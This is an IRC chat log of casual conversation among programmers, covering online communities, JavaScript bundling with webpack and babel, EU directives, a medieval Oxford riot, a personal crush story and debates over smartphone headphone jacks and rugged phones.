May 15 10:52:44 <nortti>	is mainsplaining when you go around explaining the initial user-written function of programs in C-style languages?
May 15 10:52:51 <vehk>	haha
May 15 10:52:59 <olsner>	actually, main is usually a function
May 15 10:53:08 <nortti>	fair point
May 15 10:53:10 <john_cephalopoda>	Damn, gotta leave~
May 15 10:53:22 <vehk>	Now I wonder what kind of place ##feminism is
May 15 10:53:23 <nortti>	that ~ seems to imply things™ there
May 15 10:53:42 <john_cephalopoda>	vehk: It's kinda ok. Very communist, very Antifa.
May 15 10:53:48 <vehk>	I... see?
May 15 10:54:21 <vehk>	I'm going to assume it's mostly not communist and mostly not antifa because of that.
May 15 10:54:53 <puckipedia>	lol
May 15 10:54:58 <john_cephalopoda>	Like, there were a few talks where killing Nazis because their hate speech is violence and killing them is self defence was found to be a good thing by various members of the chanel..
May 15 10:55:24 <nortti>	I'd say when I idled there I encountered a bit of an air of strict radicalism, but might have just been me being kinda bad at getting into new communities
May 15 10:55:29 <nortti>	they what?
May 15 10:55:29 <emily>	World War II, famously driven entirely by communists
May 15 10:55:54 *	vehk resolves not to join the channel
May 15 10:56:01 <john_cephalopoda>	vehk: Good idea.
May 15 10:56:08 <john_cephalopoda>	It's not really great anyway.
May 15 10:56:15 <nortti>	emily: I see you too have been reading internet communist versions of history
May 15 10:56:19 <john_cephalopoda>	Not that much talk about feminism and how to help the feminist cause.
May 15 10:56:24 <vehk>	john_cephalopoda: But it's a big thing being quieted?
May 15 10:56:25 <john_cephalopoda>	Daaamn, gotta really leave

May 15 10:57:08 <john_cephalopoda>	vehk: I like discussing with people about stuff.
May 15 10:57:15 <nortti>	actually, now that I think of it, wasn't one of the links in the suggested reading about how early (pre-ww2 iirc) soviet union wasn't actually that bad
May 15 10:57:25 <vehk>	:D: okay then?
May 15 10:57:41 <vehk>	john_cephalopoda: Seems like the wrong venue
May 15 10:59:03 <nortti>	looks like the site linked in the topic back then is gone
May 15 10:59:23 <vehk>	. o O ( a channel for every -ism )
May 15 11:00:33 <nortti>	anyways, I'm nowadays kinda distrustful of every internet community named after a specific thing. like ##conlang or ##feminism or /r/anarchism or …
May 15 11:00:34 <vehk>	< nortti> I'd say when I idled there I encountered a bit of an air of strict radicalism, but might have just been me being kinda bad at getting into new communities <- Good to see this kind of thing does not happen to me exclusively
May 15 11:01:12 <vehk>	mmh, I can see that
May 15 11:01:32 <nortti>	#anarchism was fine I guess, but mostly because noöne fucking talked there ever
May 15 11:01:40 <nortti>	except newbies
May 15 11:03:12 <vehk>	Was fine? Guess you left?
May 15 11:03:30 <nortti>	yea, I cleaned up my chans and since noöne spoke, cleared it
May 15 11:03:33 <vehk>	mhm, yeah
May 15 11:04:11 <nortti>	it feels like those kinds of places, since they have "the name", have a situation where even if the ops are shitty, people are less likely to move elsewhere, since newbies are going to still find the original one instead
May 15 11:04:43 <vehk>	Yeah, names like these have some sort of officiality to them
May 15 11:04:46 <vehk>	Or I guess carry authority
May 15 11:05:24 <zgrep>	noöne.

May 16 01:19:00 <FireFly>	 hate to say it, but for a properly pleasant experince you kinda need/want webpack and possibly babel

May 16 01:19:58 <nortti>	mh
May 16 01:20:21 <FireFly>	because even recent browsers don't support all the standardised features you'd want today, the big one missing being ES6 modules
May 16 01:20:46 <nortti>	:/
May 16 01:21:07 <FireFly>	lack of module system has plagued browser JS a lot, and it really does help a lot tjust be able to break things into files at will and import/export
May 16 01:21:24 <FireFly>	to just be able to*
May 16 01:21:51 <nortti>	hm, so, webpack lets you take files, bundle them up, and then do import/export, and babel compiles your ES6 to js actually supported by browsers?
May 16 01:44:17 <FireFly>	nortti: pretty much
May 16 01:45:40 <FireFly>	babel lets you add other transforms as well (ES2015, ES2017, features to be included in the next ES spec, completel nonstandard transforms, ...) so it's kind flexible nd you can choose where you wnt to be on that scale
May 16 01:46:30 <nortti>	ah
May 16 01:46:47 <FireFly>	webpack's main purpose is bundling things together, resolving the fependency tree statically nd emitting (mainly JS) bundles (with source maps)
May 16 01:48:21 <FireFly>	You can hadle ifferet filetypes/extensions differently, it's frequently also used to e.g. build CSS bundles of CSS files imported from JS, or invlude files verbatim, or letting you inport a JSON file and get the corresponding JS objecct as a result etc

May 16 05:30:33 <Eldis4>	​shikhin: BTFO: Acronym which stands for "blown the fuck out." Generally used to refer to a sports team that loses to another by a large margin. Especially if the losing team was expected to win. (The Philadelphia Phillies just got BTFO by the New York Mets 8-2.)

May 16 08:58:21 <olsner>	fwiw, I still haven't found a graphical merge tool that's better than just using a text editor, but at least I let the normal merging handle everything that doesn't conflict first
May 16 09:03:50 <john_cephalopoda>	olsner: Usually the changes that are done are not in files that I am working on, but things just tend to blow up when I am trying to auto-merge things, so I just re-clone and then drop in the changed files.

May 16 09:41:02 <nortti>	aiui EU passes directives which are then made into law by each member state
May 16 09:43:23 <nortti>	basically, there are no EU laws per se, and countries have some leeway in the implementation as long as they are within the parametres of the EU directive, unsure what happens if a member state doesn't pass the law
May 16 09:44:00 <nortti>	"If a member state fails to pass the required national legislation, or if the national legislation does not adequately comply with the requirements of the directive, the European Commission may initiate legal action against the member state in the European Court of Justice. This may also happen when a member state has transposed a directive in theory but has failed to abide by its provisions in practice."
May 16 09:44:06 <nortti>	"Even though directives were not originally thought to be binding before they were implemented by member states, the European Court of Justice developed the doctrine of direct effect where unimplemented or badly implemented directives can actually have direct legal force. In the important case of Francovich v. Italy, the ECJ extended the principle of Van Gend en Loos [9] to provide that Member States who 
May 16 09:44:12 <nortti>	failed to implement a directive could incur liability to pay damages to individuals and companies who had been adversely affected by such non-implementation."

May 16 11:56:13 <nortti>	"The seed of the riot was an altercation in the Swindlestock Tavern in Oxford (now the site of the Santander Bank on Carfax, on the corner of St Aldate's and Queen Street) between two students of the University of Oxford, Walter Spryngeheuse and Roger de Chesterfield, and the taverner, John Croidon. They complained about the quality of drinks, which led to an exchange of rude words that ended with the 
May 16 11:56:20 <nortti>	students throwing their drinks in the taverner's face and assaulting him.[2] Retaliation for the incident led to armed clashes between locals and students."

May 16 11:57:27 <shikhin>	"Annually thereafter, on 10 February the saint's day of St Scholastica, the mayor and councillors had to march bareheaded through the streets, attend Mass, and pay to the university a fine of one penny for every scholar killed, a total of 5s, 3d. The penance ended 470 years later in 1825, when the mayor refused to take part."
May 16 11:58:42 <nortti>	"The University of Cambridge was originally set up after a fight between the townspeople of Oxford and scholars from the University of Oxford forced many scholars to flee to a new location in 1209.[3] Later, the tension between the scholars at Cambridge and the townspeople forced the king to grant special privileges and protection to Cambridge University, which helped enormously in the survival and

May 16 13:16:04 <nortti>	not necessarily. one can get off on things that aren't fetishes
May 16 13:16:17 <shikhin>	Someone explain to me what's so terrible about object oriented languages?
May 16 13:20:08 *	shikhin blinks.
May 16 13:20:45 <shikhin>	(I'm not looking for an argument; I just tend to use object oriented languages sometimes because they work for me and am curious why everyone thinks they're awful?)

May 16 13:41:58 <hydraz>	cool
May 16 13:42:30 <shikhin>	Did she love you back?
May 16 13:43:13 <sortie>	No she wasn't that into me. Honestly I was a bit weird at the time.
May 16 13:43:25 <shikhin>	A-and you still remembered the date?

May 16 13:44:34 <bslsk05>	​<shikhin*> Did she love your back?
May 16 13:44:35 <sortie>	Honestly it's random that I just happened to remember it was today, didn't set a calendar alert
May 16 13:44:59 *	shikhin blinks.
May 16 13:45:15 <shikhin>	I had a first crush too, but I'd be darned if I even remember the year that was in (let alone any dates).
May 16 13:45:50 <sortie>	The whole thing was a bit weird, spent a good while trying to figure out exactly what happened
May 16 13:46:12 <FireFly>	I'm not good at remembering specific dates like that :D
May 16 13:46:14 <sortie>	Kinda interesting situation though. Technically I told her a few days before over chat and this was the first time we talked since.
May 16 13:46:34 <sortie>	Went to a friend's birthday party at a disco (he's a DJ)
May 16 13:46:48 <sortie>	(curiously we were basically the only small group of people that showed up)
May 16 13:47:25 <sortie>	Anyways that DJ happened to be an old childhood friend, basically the only one at my high school who knew me as a really weird young kid
May 16 13:47:43 <sortie>	(high school was a nice chance to start over without all those old embarrasing stories)
May 16 13:48:08 <sortie>	Anyways she had a talk with him and he told her I had Asperger
May 16 13:48:10 <sortie>	's.
May 16 13:48:27 <sortie>	Then a lot of stuff made sense to her and she felt a lot better about me
May 16 13:48:34 <shikhin>	:D:
May 16 13:48:39 <sortie>	She told me and that's nice
May 16 13:49:11 <sortie>	The fun thing was that at the time I did believe I had Aspergers. Though I had *totally* forgotten about it because I was a lot more normal now.
May 16 13:49:24 <shikhin>	was a lot more? am a lot more?
May 16 13:49:35 <sortie>	at the time
May 16 13:49:53 <shikhin>	You were a lot more normal now at the time?
May 16 13:49:54 *	shikhin blinks.
May 16 13:49:54 <sortie>	But I actually don't have such a diagnosis.
May 16 13:50:09 <sortie>	shikhin: Back in 2008, I was starting to be a lot more normal.
May 16 13:50:22 <sortie>	And I had totally forgotten about supposedly having Aspergers.
May 16 13:50:25 <shikhin>	Aah.
May 16 13:50:28 <shikhin>	Complicated sentence.
May 16 13:51:13 <sortie>	A couple years back, I dig through old papers about me. Turns out I don't have such a diagonisis. So what happened was that I was checked, and they didn't think a big school would be good for me, so they recommended a small school. And if that didn't work out, they would check me further.
May 16 13:51:32 <sortie>	So my parents appearently misunderstood that situation and jumped to conclusions. Then told me at some point and I told people.
May 16 13:51:53 <sortie>	Honestly it would make sense if I have it, maybe when I was young. I am a bit weird.
May 16 13:51:56 <shikhin>	Haha.
May 16 13:52:07 <sortie>	But it's also fairly well explained by me just being a bit weird, and being a nerd.
May 16 13:52:22 <sortie>	And maybe just being a bit less mature and a bit more self-involved?
May 16 13:52:52 *	shikhin doesn't think sortie's that weird.
May 16 13:52:52 <sortie>	So these days, yes, I am a bit weird still. But I kinda own it now? I choose to be the way I am. And I kinda think I can act normal enough.
May 16 13:53:24 <sortie>	shikhin: Well, you know how 2011-sortie's code makes me cringe? Oh god 2008-sortie makes me cringe.
May 16 13:53:35 <shikhin>	Hehe.
May 16 13:53:37 <sortie>	Recently went through my old facebook history. Oh god so much cringe.
May 16 13:53:48 <shikhin>	2018-04-01-shikhin makes me cringe.
May 16 13:54:17 <sortie>	So anyways, girl finds out, tells me she understands (her mom is a nurse, so she knows what it means) and it's a nice moment and nice.
May 16 13:54:22 <sortie>	No real rejection AFAIK.
May 16 13:54:38 <sortie>	So she was kinda in doubt, and I guess that's kinda nice?
May 16 13:54:56 <shikhin>	"No real rejection" – oh, reminds me of one childhood story.
May 16 13:55:25 <shikhin>	Someone told me they liked. I didn't know them that well (and they didn't know me that well?), so I just responded with "okay".
May 16 13:55:36 <shikhin>	(Then they told everyone in school that I responded with just "okay", and it became a big thing.)
May 16 13:55:53 <sortie>	Anyways she was pretty drunk. And the music in the disco upsets her stomach or something. Anyways they us all out because we're not 18 and the DJ didn't actually get many more than us to show up, so party is over early.
May 16 13:56:14 <sortie>	I get my dad to drive her home on the way back, gets a nice thank you text in the morning
May 16 13:56:19 <CompanionCube>	http://www.bbc.co.uk/news/business-44142258 gee
May 16 13:56:22 <bslsk05>	​www.bbc.co.uk: East Coast train line to be put into public control - BBC News
May 16 13:56:35 <sortie>	And the following Monday, we have a talk, and she's not really into me. I think she said something about bad boys.
May 16 13:56:45 <CompanionCube>	I don't know if this is the 2nd or 3rd time this has happened.
May 16 13:57:04 *	shikhin prods nanovad.
May 16 13:57:21 <sortie>	Anyways that's an old story, hadn't thought about it for a while. I just happened to recognize the date and it brought up some old memories.
May 16 13:57:36 *	FireFly nods
May 16 13:57:44 <FireFly>	specific events/memories like that can be fun
May 16 13:57:46 <sortie>	It's way before I started keeping logs of what happened, so I am not even quite sure what happened
May 16 13:57:51 <FireFly>	also can be less fun, of course
May 16 13:57:56 <sortie>	And not quire sure what she said
May 16 13:58:20 <sortie>	I don't think I was that rejected at first, I think she was uncertain.
May 16 13:58:38 <shikhin>	Can still get in touch with her?
May 16 13:58:40 <sortie>	Sure
May 16 13:58:51 <shikhin>	Might be fun to find out what she thinks happened.
May 16 13:59:15 <FireFly>	Reminds me that I should maybe get back in touch with some people I considered good friends growing up
May 16 13:59:42 <sortie>	Well I'm still waiting for the fandom to petition the studio enough that they greenlight a standalone movie 10 years later during the reunion where a bunch of awkward stuff happens
May 16 14:00:11 <sortie>	shikhin: But honestly I don't want to ask "hey so about 10 years ago". That's just weird.
May 16 14:00:32 <sortie>	I would be interested in knowing what she thinks, though, just because I don't trust my own POV.
May 16 14:01:00 <shikhin>	sortie: Just screen capture this conversation and send it to her.
May 16 14:01:11 <sortie>	Yeah don't
May 16 14:01:31 <sortie>	Anyways I'm pretty sure I behaved poorly back then
May 16 14:02:39 <emily>	I've done "hey so about 10 years ago".
May 16 14:02:45 <emily>	it's usually been rewarding.
May 16 14:02:48 <emily>	it's underrated.
May 16 14:03:23 <sortie>	I've grown up a lot in the recent years. Thanks to people like you, and following some really good people on twitter. And while these memories are kinda nice because they're mine, they're also a bit bad, but I learn from them.
May 16 14:03:56 <FireFly>	emily: hey so about 10 years ago,
May 16 14:04:08 <shikhin>	emily: H--wait, FireFly did this.
May 16 14:04:21 <sortie>	emily: Hmm that does sound nice.
May 16 14:04:25 <emily>	FireFly: did we even interact then :P
May 16 14:04:27 <shikhin>	sortie: People like *me*?
May 16 14:04:41 <FireFly>	shikhin: it's amusing because she did kinda go "hey so I remember you from way back" at me a while ago :P
May 16 14:04:47 <FireFly>	which is why we even have an emily in her now!
May 16 14:04:48 <FireFly>	here*
May 16 14:04:53 <FireFly>	indirectly, kinda
May 16 14:04:54 <sortie>	shikhin: I learned how much a good gal appreciates a strong manly smell of malcompliance.
May 16 14:04:55 <emily>	the worst "hey so about N years ago" I've got was being guilted into comforting someone because of bringing up a way they'd hurt/mistreated me.
May 16 14:04:56 <shikhin>	An emily in emily?
May 16 14:05:02 <emily>	but that was just due to bad timing/circumstances to do it in.
May 16 14:05:09 <shikhin>	sortie: :D:
May 16 14:05:13 <FireFly>	emily: :\
May 16 14:05:30 <FireFly>	<+emily> FireFly: did we even interact then :P  <- I guess not really :P
May 16 14:05:41 *	FireFly pets emily
May 16 14:05:49 <emily>	purrrr~
May 16 14:05:54 <emily>	I like how I'm still voiced
May 16 14:05:58 <sortie>	shikhin: Well I mean, I read on twitter how these women have been harassed so much, and how there's a lot of mild harassment and so on. I really had no idea about that at the time.
May 16 14:05:59 <emily>	it's like an uptime brag
May 16 14:06:12 <shikhin>	sortie: *nod*
May 16 14:06:33 *	shikhin is very tempted to unvoice emily.
May 16 14:06:34 <sortie>	shikhin: I simply didn't know. I must really have come across wrong a bunch of times.
May 16 14:07:10 <emily>	yeah, it's not that long ago that it was a lot easier to just be completely ignorant of tons of prejudice
May 16 14:07:16 <FireFly>	#voice emily for being insufficiently voiced

May 16 14:07:54 <sortie>	emily
May 16 14:08:01 <emily>	hi
May 16 14:08:35 <sortie>	So no real point to my story here. It's something that happened. It meant a lot to me at the time, and honestly it being a classmate, it took me years to get over her.
May 16 14:09:16 <sortie>	Well, it depends, I mean I also dated different girls during high school and was into various people, but I was always a bit into her.
May 16 14:09:49 <sortie>	So yeah that's some good old sortie backstory I don't think I ever mentioned here (oh hey it's an origin story oh no).
May 16 14:10:03 <nanovad>	sortie: Just don't make your supersuit green or animated.
May 16 14:10:06 <nanovad>	shikhin: prod?

May 16 14:10:24 <asecretcat-web>	#voice emily for emily's sake of emily
May 16 14:10:25 <shikhin>	No, nevermind. Gamey?
May 16 14:10:32 <asecretcat-web>	oh, whoops right, web chat
May 16 14:11:48 <FireFly>	ah, not identified?
May 16 14:11:56 <sortie>	Learned a lot from the whole experience. Unclear on exactly what happened. It's both nice memories and things that make me cringe. Cringeworthy memories makes me consider what would have been better to have done and that makes me play the "what if" mind game and then I just overthink the whole thing for a while.
May 16 14:11:58 <asecretcat-web>	nah, not registered :D:
May 16 14:11:59 <nanovad>	shikhin: eh, don't really feel like it right now

May 16 14:12:17 <FireFly>	asecretcat-web: I mean you could identify to your account manually still, but it's probably a bit bothersome
May 16 14:12:39 <FireFly>	you can "identify <nickname> <password>"
May 16 14:12:49 <FireFly>	which works for identifying to a ns account not matching your current nick

May 16 14:16:28 <shikhin>	sortie: A story from when I came back to India after spending most of my childhood in Lesotho and joined a local school. Really needed to pee, asked someone where the toilet is. They gave me confusing directions in Hindi (which wasn't my strongest suit then). Followed them to the best that I could, ended up in the school grounds… thought that was where people peed here, and ended up peeing on grounds 
May 16 14:16:34 <shikhin>	in open.
May 16 14:16:48 <FireFly>	asecretcat-web: hm, how much is it?
May 16 14:17:57 <FireFly>	like I can't see the price it seems I guess because I'm not on a mac
May 16 14:18:05 <sortie>	shikhin: :D That sounds about right?
May 16 14:18:14 <asecretcat-web>	FireFly: seems like $8 for a normal download, the mac app store offers it i think as an in app purchase but doesn't say how much there, probably the same though.
May 16 14:19:11 <FireFly>	Ah
May 16 14:19:38 <sortie>	I fixed my above photographs with my program that tries to correct damage to my phone's camera. Not entirely fixed but it's better than the originals.

May 16 14:19:53 <asecretcat-web>	ah it's alright, thanks though hehe
May 16 14:20:11 <FireFly>	aww, ah well

May 16 14:21:58 <sortie>	shikhin: But the main problem I say I'm stuck at is that I have no idea what phone to get.

May 16 14:22:53 <sortie>	You will not make me use bluetooth audio
May 16 14:22:54 <asecretcat-web>	why is google falling in with that
May 16 14:23:02 *	shikhin shrugs.
May 16 14:23:10 <hydraz>	everything apple does other companies blindly follow
May 16 14:23:11 <sortie>	asecretcat-web: Between you and here, the internal sentiment is similar
May 16 14:23:26 <sortie>	Because surely a waterproof phone is what I need
May 16 14:23:40 <asecretcat-web>	pretty much craters my interest in the pixel i guess
May 16 14:23:54 <sortie>	(which is interesting? Can't you just put a good resistor or something on the audio jack so it can't short? Is there a fundamental limitation?)
May 16 14:24:02 <sortie>	And then the question is what to get
May 16 14:24:23 <sortie>	I don't have any non-public information, but if a Pixel 3 appeared with audio jack, I probably would get that
May 16 14:24:29 <sortie>	So I wait for that?
May 16 14:24:38 <sortie>	Or for someone to say “hey try this samsung” or whatever
May 16 14:24:44 <sortie>	Or for my phone to break
May 16 14:24:49 <shikhin>	I have a lot of non-public information, and I doubt there'd suddenly be a Pixel 3 with an audio jack.
May 16 14:24:52 <sortie>	Which seems likely to happen.
May 16 14:25:48 <sortie>	Nice chatting here tonight
May 16 14:27:01 <asecretcat-web>	i guess this really is going to be a trend with high end phones.
May 16 14:27:06 <emily>	sortie: you can use usb-c audio
May 16 14:27:09 <emily>	i assume
May 16 14:27:26 <emily>	I am pretty confident Pixel 3+ will not have audio jacks.
May 16 14:27:36 <emily>	no phone that has removed audio jacks will re-add them
May 16 14:28:02 <emily>	(maybe not literally no, but)
May 16 14:28:28 <emily>	Like, I've heard both business and engineering concerns (and supposedly it was the latter that drove it in most cases, though I have my scepticism)
May 16 14:28:40 <emily>	if the decision was made on engineering concerns, it's unlikely to be reversed
May 16 14:28:48 <nanovad>	Wait.
May 16 14:28:58 <nanovad>	If the problem is waterproofing, how the hell isn't the USB3 jack shorting?
May 16 14:29:07 <emily>	and business-wise, the trend is already established enough that there's unlikely to be a reason to go back on it; also you can't really make your newer model of phone *thicker* than the last one, the Pixel 2 is too thin for an audio jack.
May 16 14:29:31 <nanovad>	(side note: fuck the trend of thin phones. They're getting too thin to hold comfortably. Most people are putting cases on now that bulk them up.)
May 16 14:29:42 <shikhin>	Eh, isn't the newer iPhone thicker than the last one? I don't think thickness is a big concern, really.
May 16 14:29:56 <hydraz>	my new phone has a back cover so smooth that it has like, 0 frictin
May 16 14:30:00 <hydraz>	it's a moto g 5s
May 16 14:30:13 <shikhin>	nanovad: H-hrm?
May 16 14:30:15 <nanovad>	Mine's some rubberized plastic
May 16 14:30:40 <nanovad>	shikhin: I abhor the "thinner is better" trend from smartphone manufacturers
May 16 14:30:41 <shikhin>	nanovad: Thin phones sound like win-win to me. You either like the thinness, or you can just put on a cheap case. Or a good case that's nice and provides more protection.
May 16 14:31:08 <nanovad>	Yeah, but the case changes the ergonomics of the phone
May 16 14:31:14 <nanovad>	I've yet to find any cases that I actually like to use :<
May 16 14:31:19 <shikhin>	Buy better cases.
May 16 14:31:22 <nanovad>	^^
May 16 14:31:32 <shikhin>	^^
May 16 14:31:35 <nanovad>	Besides that, it's hard to find cases for older phones.
May 16 14:31:46 <nanovad>	Without getting some $2 knock-off from China that does jack shit
May 16 14:31:47 <emily>	I do the not using a case thing, because I don't know, I guess I'm just that kind of person.
May 16 14:31:57 <nanovad>	emily: I see you also like to live dangerously
May 16 14:31:57 <emily>	they just look ugly and feel weird to me.
May 16 14:32:01 <nanovad>	Yeah, that too
May 16 14:32:08 <nanovad>	I don't mind the look, I'm mostly a function over form kinda person
May 16 14:32:11 <shikhin>	Me too, but $$$$ and I really handle my phone poorly.
May 16 14:32:15 <nanovad>	But the function isn't there either :s
May 16 14:32:20 <emily>	I realise this is essentially the privilege of "my life won't end if I break my only phone because I can easily acquire a new one".
May 16 14:32:27 <shikhin>	I-it is? Pretty sure my phone would be in multiple pieces without the case.
May 16 14:32:36 <nanovad>	Hm, reminds me: every iPad case i've used has really bad button force transitions from the case buttons to the phone
May 16 14:32:43 <emily>	I'm just careful with my phone.
May 16 14:32:55 <nanovad>	shikhin: I mean ease of use on the phone with case / without case, not protection
May 16 14:32:57 <emily>	yeah, making the buttons unusable is one of the worst parts
May 16 14:32:57 <shikhin>	Dunno, I would like to think so am I.
May 16 14:33:00 <emily>	even the good cases seem like that
May 16 14:33:02 <nanovad>	Yeah, I'm super careful with mine
May 16 14:33:19 <emily>	I'm basically always using my phone two-handed outside
May 16 14:33:44 <asecretcat-web>	at least the phablet trend never took off.  then phones would be too huge for my hands.
May 16 14:34:26 <emily>	it sorta did in the form of XL models
May 16 14:34:33 <emily>	iPhone Plus, Pixel XL etc.
May 16 14:34:46 <shikhin>	Dunno, aren't the Pixel XLs / Samsung XL thingies / Samsung Note whatever just phablets of the yesteryears?
May 16 14:34:49 <shikhin>	Right.
May 16 14:34:58 <asecretcat-web>	i see.....interesting
May 16 14:35:08 <nanovad>	I wish I could have the form of a Droid Maxx with modern guts.
May 16 14:35:13 <shikhin>	emily: What phone do you have, out of curiosity?
May 16 14:35:44 <emily>	Pixel 2.
May 16 14:36:10 <sortie>	emily: USB C audio. For when you don't charge.
May 16 14:36:45 <nanovad>	heh, I have a friend that I Skype sometimes who has an iPhone… 7? and constantly has to hang up because the phone dies and she can't charge it while using her earbuds.
May 16 14:36:47 <shikhin>	nanovad: There are rugged modern phones, though?
May 16 14:36:50 <emily>	it's good. mine has a few glitches that make me want to try and replace the hardware but using the warranty would be a pain. Also it's slightly underwhelming for what you'd expect of a phone with flagship price (big bezel, not super bright/vivid screen, etc.)
May 16 14:36:52 <sortie>	emily: Well I won't buy a phone without it.
May 16 14:36:55 <nanovad>	shikhin: oh?
May 16 14:37:00 <sortie>	emily: There's their business rationale. :)
May 16 14:37:05 <emily>	sortie: *nods*
May 16 14:37:13 <sortie>	Announce the Sortix phone.
May 16 14:37:20 <nanovad>	emily: . o O ( those concerns apply to the Galaxy S{fuckit} )
May 16 14:37:22 <shikhin>	nanovad: Samsung S8 Active? There'll be an S9 active soon, presumably. Or other Samsung Active phones.
May 16 14:37:24 <emily>	sortie: you are unlikely to factor into any relevant demographic :p
May 16 14:37:33 <sortie>	emily: Hello. I am high end engineer.
May 16 14:37:40 <emily>	of course
May 16 14:37:47 <emily>	but everyone knows programmers have weird and marginal preferences
May 16 14:37:50 <nanovad>	shikhin: hm, is that more expensive?
May 16 14:38:00 <emily>	if the Pixel were designed for technical Google employees it'd be a fucking mess :p
May 16 14:38:07 <sortie>	emily: Hello. I can just mail the relevant internal people and complain. Or just meme internally about it.
May 16 14:38:15 <emily>	sure
May 16 14:38:17 <shikhin>	nanovad: Dunno, do you buy things on contract?
May 16 14:38:28 <emily>	I think you'll be like the 1000th person to do that internally and it won't have any effect
May 16 14:38:40 <nanovad>	shikhin: I do think it's quite silly that you have to buy a specifically ruggedized phone just so that it can withstand a 4in fall onto something semi-hard.
May 16 14:38:46 <emily>	I *wish* I could get my partner to poke people internally to get Google hardware designed exactly how I'd like!
May 16 14:38:53 <hydraz>	what's an S8 Active?
May 16 14:38:57 <nanovad>	I've seen things you wouldn't believe. Cracked phones off the side of a table.
May 16 14:39:04 <shikhin>	hydraz: A phone.
May 16 14:39:09 <nanovad>	All these repairs will be lost. Like cases on display.
May 16 14:39:10 <hydraz>	fuck you
May 16 14:39:14 <sortie>	hydraz: Slightly more than a S7 Club.
May 16 14:39:16 <shikhin>	Hm?
May 16 14:39:21 <nanovad>	hydraz: "Features a shatter-resistant screen,¹ a military-grade body with a durable metal frame.¹"
May 16 14:39:27 <hydraz>	I see, thanks nanovad
May 16 14:39:32 <asecretcat-web>	> military-grade body
May 16 14:39:32 *	shikhin blinks.
May 16 14:39:41 <nanovad>	military-grade: we're using second-from-the-bottom tier shit metal instead of bottom-tier shit metal
May 16 14:39:46 <nanovad>	now give us moneys
May 16 14:39:49 <shikhin>	I-I didn't mean to be rude, I thought the fact that it's a phone and its name gave you all the relevant details.
May 16 14:40:01 <nanovad>	hydraz: other than that, normal S8 I guess
May 16 14:40:09 <hydraz>	shikhin: I didn't realise there were Passive phones.
May 16 14:40:15 <nanovad>	"Buy any GS8, S8+, or S8 Active, receive a free $100 Lyft credit" :D:
May 16 14:40:26 <hydraz>	In fact I'm pretty sure every phone is Active >.<
May 16 14:40:28 <shikhin>	nanovad: Older Active phones also had physical buttons, but they did away with that.
May 16 14:40:48 <nanovad>	I like my capacitive buttons for multifunction and hard switches for power/volume
May 16 14:40:55 <nanovad>	They don't rotate, but *shrug*
May 16 14:41:34 <shikhin>	As for "phones should be able to survive big drops out of the box," I personally just like the idea of a thin enough phone and then you either think you'll handle it carefully or you put on a case for protection on it.
May 16 14:41:42 <nanovad>	Reminds me; when I activated this phone, the tech was using it behind the counter. Said "Your home button is messed up, I think. Oh, there it goes." Once we leave the store, I started checking the button cluster (it was a home-refurbished phone) and started to get a bit scared.
May 16 14:41:50 <shikhin>	Clearly some people fall into the former category.
May 16 14:41:57 <nanovad>	Turns out the massive fingerprint spooge they left made the buttons not work :D:
May 16 14:42:05 <shikhin>	And if you fall into the latter, you'd probably like the customizable cases more than a standard fat phone.
May 16 14:42:17 <nanovad>	shikhin: Why wouldn't you want a phone that can withstand any reasonable shock OOTB?
May 16 14:42:25 <shikhin>	nanovad: Thickness? Looks ugly?
May 16 14:42:32 <nanovad>	Ugly? :D:
May 16 14:42:36 <shikhin>	Yes?
May 16 14:42:53 *	nanovad . o O ( the year is 2020. shikhin is using a single piece of holo glass for a phone. "I'll put a case on it." )
May 16 14:43:24 <shikhin>	*shrug* How is this worse than everyone just having fat phones and no one getting the option of using a thinner phone?
May 16 14:43:25 <nanovad>	Again, I don't see why thickness is a bad thing. I have yet to hear anyone say they want a phone that's so thin that they can't comfortably hold it (though obviously comfort differs)
May 16 14:43:37 <nanovad>	shikhin: Durability and the ability to cram more battery in, ofc
May 16 14:43:38 <hydraz>	nanovad: :D~1
May 16 14:43:45 <hydraz>	now it's ~2
May 16 14:43:47 <shikhin>	nanovad: If it meets their needs.
May 16 14:44:02 <nanovad>	The problem is that people who want thick phones don't have the option of thick phones :P everything is thin
May 16 14:44:25 <sortie>	niht
May 16 14:44:27 <shikhin>	I just gave you an example of a nice thick phone…
May 16 14:44:41 <hydraz>	sortie: niht
May 16 14:44:44 <nanovad>	sortie: niht
May 16 14:44:50 <shikhin>	s/a nice thick phone/a series of nice thick phones/
May 16 14:44:50 <bslsk05>	​<shikhin*> I just gave you an example of a series of nice thick phones…
May 16 14:44:51 <sprocklem>	sortie: niht
May 16 14:45:39 *	shikhin watches a random video of someone dropping an S8 Active from 15 feet and it surviving pretty well.
May 16 14:45:59 <shikhin>	(i.e., minor bumps and whatnot; everything works)
May 16 14:46:25 <nanovad>	shikhin: eh, but that's one series. Personally I don't like samsung either, so…
May 16 14:46:51 <nanovad>	I think Motorola ended up making some absurdly thin phone… like 5mm or something
May 16 14:47:07 <shikhin>	There's the Razer phone. It's fat because very big battery.
May 16 14:47:23 <hydraz>	this is 9.5mm
May 16 14:47:49 <hydraz>	pretty sure the moto z is ~half that
May 16 14:47:59 <hydraz>	5.19 mm
May 16 14:48:01 <shikhin>	There's a lot of fat phones for all kinds of purposes. I'm pretty sure there's other rugged phones too… so… yeah.
May 16 14:48:05 <nanovad>	5.2- yeah
May 16 14:48:34 <hydraz>	me, I'm sticking with the boring old Moto G family while it still has a headphone jack
May 16 14:48:47 <hydraz>	passable screen, passable price, passable fingerprint sensor, passable size..

May 16 14:49:04 <nanovad>	shikhin: I guess what I'm trying to say is, I don't see a reason why all phones shouldn't be 'rugged'. If they can be somewhat thin too, then it's a win-win. Maybe that's just my priorities though
May 16 14:49:10 <nanovad>	imo nearly all phones break too easily
May 16 14:49:14 <hydraz>	The fact that "rugged smartphone" is a category at all is kinda distressing
May 16 14:49:32 <shikhin>	nanovad: I guess what I'm trying to say is that clearly not everyone wants that (e.g. I don't), but surely I should let you tell me what I want.
May 16 14:51:07 *	sortie has quit (Quit: Leaving)
May 16 14:51:30 <nanovad>	shikhin: I'm saying options, not "all phones should be thick"
May 16 14:51:38 *	shikhin just showed you options. :(
May 16 14:52:03 <shikhin>	(Then you said "I don't see a reason why all phones shouldn't be 'rugged'". Then I said what I just did. Then you said you didn't say all phones should be thick. I'm so very confused.)
May 16 14:52:15 <nanovad>	rugged != thick
May 16 14:52:18 <hydraz>	Why are "thin glass" and "brick" the only two options?
May 16 14:52:23 <nanovad>	There's a way to be rugged and thin, if you want that. We just haven't figured it out.
May 16 14:52:43 <john_cephalopoda>	If you want a rugged phone, DON'T get CAT.
May 16 14:52:44 <shikhin>	S-sure. I would like currently-impossible things too.
May 16 14:53:04 <hydraz>	=w CAT
